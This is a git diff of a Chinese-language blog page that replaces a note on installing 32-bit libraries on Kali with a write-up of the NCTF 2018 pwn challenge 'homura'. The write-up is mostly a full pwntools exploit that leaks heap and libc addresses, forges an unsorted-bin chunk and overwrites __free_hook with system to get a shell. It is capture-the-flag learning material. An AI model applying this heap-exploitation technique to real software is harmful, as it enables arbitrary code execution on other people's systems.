@@ -4,24 +4,24 @@
 <head>
   <meta charset="UTF-8">
   
-    <title>Kali 64位 安装32位库并编译程序 | Reshahar的博客</title>
+    <title>nctf2018-homura的exp | Reshahar的博客</title>
     <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
     
     <meta name="author" content="Reshahar">
     
 
     
-    <meta name="description" content="Kali 安装32位库">
-<meta name="keywords" content="linux,gcc,g++">
+    <meta name="description" content="nctf2018的pwn题homura的exp思路及脚本">
+<meta name="keywords" content="pwn,exp,heap,unsorted-bin">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Kali 64位 安装32位库并编译程序">
-<meta property="og:url" content="http://Reshahar.github.io/2017/04/13/Kali 64位 安装32位库并编译程序/index.html">
+<meta property="og:title" content="nctf2018-homura的exp">
+<meta property="og:url" content="http://Reshahar.github.io/2018/12/23/nctf2018-homura的exp/index.html">
 <meta property="og:site_name" content="Reshahar的博客">
-<meta property="og:description" content="Kali 安装32位库">
-<meta property="og:updated_time" content="2017-04-13T14:08:58.000Z">
+<meta property="og:description" content="nctf2018的pwn题homura的exp思路及脚本">
+<meta property="og:updated_time" content="2018-12-23T04:29:07.615Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Kali 64位 安装32位库并编译程序">
-<meta name="twitter:description" content="Kali 安装32位库">
+<meta name="twitter:title" content="nctf2018-homura的exp">
+<meta name="twitter:description" content="nctf2018的pwn题homura的exp思路及脚本">
 
     
     <link rel="alternative" href="/atom.xml" title="Reshahar的博客" type="application/atom+xml">
@@ -82,14 +82,14 @@
 		<header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/2017/04/13/Kali 64位 安装32位库并编译程序/" title="Kali 64位 安装32位库并编译程序" itemprop="url">Kali 64位 安装32位库并编译程序</a>
+      <a href="/2018/12/23/nctf2018-homura的exp/" title="nctf2018-homura的exp" itemprop="url">nctf2018-homura的exp</a>
   </h1>
   <p class="article-author">By
        
 		<a href="/" title="Reshahar" target="_blank" itemprop="author">Reshahar</a>
 		
   <p class="article-time">
-    <time datetime="2017-04-13T13:54:24.000Z" itemprop="datePublished"> 发表于 2017-04-13</time>
+    <time datetime="2018-12-23T04:15:42.000Z" itemprop="datePublished"> 发表于 2018-12-23</time>
       
      &nbsp
      <span id="busuanzi_container_page_pv" style="display:none">
@@ -103,28 +103,150 @@
 		<div id="toc" class="toc-article">
 			<strong class="toc-title">文章目录</strong>
 		
-			
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#思路"><span class="toc-number">1.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#完整exp"><span class="toc-number">2.</span> <span class="toc-text">完整exp</span></a></li></ol>
 		
 		</div>
 		
-		<p>Kali 安装32位库</p>
+		<p>nctf2018的pwn题homura的exp思路及脚本</p>
 <hr>
 <a id="more"></a>
-<p>1.启用兼容模式<br>    dpkg –add-architecture i386<br>2.升级一下<br>    apt-get update<br>3.安装<br>    apt-get install libc6:i386<br>下面编译环境安装，否则可能报错<br>    apt-get install gcc-multilib<br>    apt-get install g++-multilib</p>
-  
+<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>1.通过name泄露heap地址<br>2.通过伪造劫持unsorted bin的bk伪造堆块到small-bins中<br>3.控制堆上的name和buf指针，leak libc 和 wirte free_hook</p>
+<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><pre><code>from pwn import *
+
+def ru(data,drop=False):
+    return p.recvuntil(data,drop=drop)
+
+def rl():
+    return p.recvline()
+
+def ra():
+    return p.recvall()
+
+def r(l):
+    return p.recv(l)
+
+def sl(data):
+    p.sendline(data)
+
+def s(data):
+    p.send(data)
+
+def ga(data,rd=&quot;\x0a&quot;):
+    ru(data)
+    return u64(ru(rd,drop=True).ljust(8,&quot;\x00&quot;))
+
+def g():
+    gdb.attach(p)
+    raw_input()
+
+def ri():
+    raw_input()
+
+def gp():
+    print proc.pidof(p)[0]
+    ri()
+
+def add(nl,n,ml,m):
+    ru(&quot;&gt;&gt;&quot;)
+    sl(str(1))
+    ru(&quot;length of your name:&quot;)
+    if nl==-1:
+        sl(str(nl))
+    else:  
+        sl(str(nl))
+        ru(&quot;your name:&quot;)
+        s(n)
+    ru(&quot;size of your message:&quot;)
+    sl(str(ml))
+    ru(&quot;please leave your message:&quot;)
+    sl(m)
+
+def remove(idx):
+    ru(&quot;&gt;&gt;&quot;)
+    sl(str(2))
+    ru(&quot;index:&quot;)
+    sl(str(idx))
+
+def modfiy(idx,s,m):
+    ru(&quot;&gt;&gt;&quot;)
+    sl(str(3))
+    ru(&quot;index:&quot;)
+    sl(str(idx))
+    ru(&quot;size:&quot;)
+    sl(str(s))
+    ru(&quot;&gt;&quot;)
+    sl(m)
+
+def leak(idx,s,m):
+    ru(&quot;&gt;&gt;&quot;)
+    sl(str(3))
+    ru(&quot;index:&quot;)
+    sl(str(idx))
+    ru(&quot;size:&quot;)
+    sl(str(s))
+    heap = ga(&apos;Hello &apos;,&apos; you&apos;)
+    ru(&quot;&gt;&quot;)
+    sl(m)
+    return heap
+
+
+if __name__ == &apos;__main__&apos;:
+    # context.log_level = &quot;debug&quot;
+    libc = ELF(&quot;./libc.so.6&quot;)
+    p = process(&apos;./homura&apos;)
+    add(12,&apos;1&apos;*10+&apos;\n&apos;,0x90,&apos;a&apos;*0x80) #0
+    add(12,&apos;2&apos;*10+&apos;\n&apos;,0x90,&apos;b&apos;*0x80) #1
+    add(12,&apos;3&apos;*10+&apos;\n&apos;,0x90,&apos;c&apos;*0x80) #2
+    remove(1)
+    remove(0)
+    add(-1,&apos;&apos;,0x90,&apos;d&apos;*0x80) #0
+    heap = leak(0,0x80,&apos;x&apos;*0x60)
+    print hex(heap)
+    add(12,&apos;2&apos;*10+&apos;\n&apos;,0x90,&apos;h&apos;*0x80) #1
+    #
+    add(0x10,&apos;4&apos;*8+&apos;\n&apos;,0xa0,&apos;d&apos;*0x60+p64(0)+p64(0xc1)+p64(heap+0x320)+p64(heap+0x420)) # 
+    # 0           c1
+    # xxx410    xxx510
+    add(0x10,&apos;5&apos;*8+&apos;\n&apos;,0xa0,&apos;e&apos;*0x20+p64(0xc0)+p64(0x91)) #4
+    add(0x10,&apos;6&apos;*8+&apos;\n&apos;,0xa0,&apos;f&apos;*0x80) #5
+    add(0x10,&apos;7&apos;*8+&apos;\n&apos;,0xa0,&apos;g&apos;*0x80) #6
+    modfiy(4,0x80,&apos;z&apos;*0x10)
+    remove(3)
+    remove(4)
+    remove(5)
+    # gp()
+    modfiy(4,0x80,p64(heap+0x220)+p64(heap+0x290))
+    add(0x10,&apos;8&apos;*8+&apos;\n&apos;,0x90,&apos;h&apos;*0x3) # 3
+    add(0x10,&apos;9&apos;*8+&apos;\n&apos;,0xa0,&apos;k&apos;*0x3) # 4
+    add(0x10,&apos;8&apos;*8+&apos;\n&apos;,0xa0,p64(0)*9+p64(0x21)+p64(heap+0x430)+p64(heap+0x330)) # 5
+    main_arena = 0x3C4B20
+    libc_addr = leak(4,0x80,&apos;z&apos;) - 0x108 - main_arena 
+    print hex(libc_addr)
+    free_hook = libc_addr + libc.symbols[&apos;__free_hook&apos;]
+    print hex(free_hook)
+    system_addr = libc_addr + libc.symbols[&apos;system&apos;]
+    add(0x10,&apos;9&apos;*8+&apos;\n&apos;,0xa0,&apos;x&apos;*0x3) # 7
+    # gp()
+    remove(5)
+    add(0x10,&apos;/bin/sh\x00&apos;+&apos;\n&apos;,0xa0,p64(0)*9+p64(0x21)+p64(heap+0x430)+p64(free_hook))#5
+    modfiy(4,0x10,p64(system_addr))
+    # gp()
+    remove(5)
+    p.interactive()
+</code></pre>  
 	</div>
 		<footer class="article-footer clearfix">
 <div class="article-catetags">
 
 <div class="article-categories">
   <span></span>
-  <a class="article-category-link" href="/categories/其它/">其它</a>
+  <a class="article-category-link" href="/categories/ctf-pwn/">ctf-pwn</a>
 </div>
 
 
   <div class="article-tags">
   
-  <span></span> <a href="/tags/linux/">linux</a><a href="/tags/gcc/">gcc</a><a href="/tags/g/">g++</a>
+  <span></span> <a href="/tags/pwn/">pwn</a><a href="/tags/exp/">exp</a><a href="/tags/heap/">heap</a><a href="/tags/unsorted-bin/">unsorted-bin</a>
   </div>
 
 </div>
@@ -133,7 +255,7 @@
 
 	<div class="article-share" id="share">
 	
-	  <div data-url="http://Reshahar.github.io/2017/04/13/Kali 64位 安装32位库并编译程序/" data-title="Kali 64位 安装32位库并编译程序 | Reshahar的博客" data-tsina="null" class="share clearfix">
+	  <div data-url="http://Reshahar.github.io/2018/12/23/nctf2018-homura的exp/" data-title="nctf2018-homura的exp | Reshahar的博客" data-tsina="null" class="share clearfix">
 	  </div>
 	
 	</div>
@@ -147,21 +269,13 @@
 <nav class="article-nav clearfix">
  
  <div class="prev" >
- <a href="/2017/04/13/脱壳/" title="脱壳">
+ <a href="/2018/12/12/2018铁三赛决赛三道pwn题exp/" title="2018铁三赛决赛三道pwn题exp">
   <strong>上一篇：</strong><br/>
   <span>
-  脱壳</span>
+  2018铁三赛决赛三道pwn题exp</span>
 </a>
 </div>
 
-
-<div class="next">
-<a href="/2017/04/13/一个简单的逆向/"  title="一个简单的逆向">
- <strong>下一篇：</strong><br/> 
- <span>一个简单的逆向
-</span>
-</a>
-</div>
 
 </nav>
 
@@ -173,7 +287,7 @@
   <div id="toc" class="toc-aside">
   <strong class="toc-title">文章目录</strong>
  
- 
+ <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#思路"><span class="toc-number">1.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#完整exp"><span class="toc-number">2.</span> <span class="toc-text">完整exp</span></a></li></ol>
  
   </div>
 
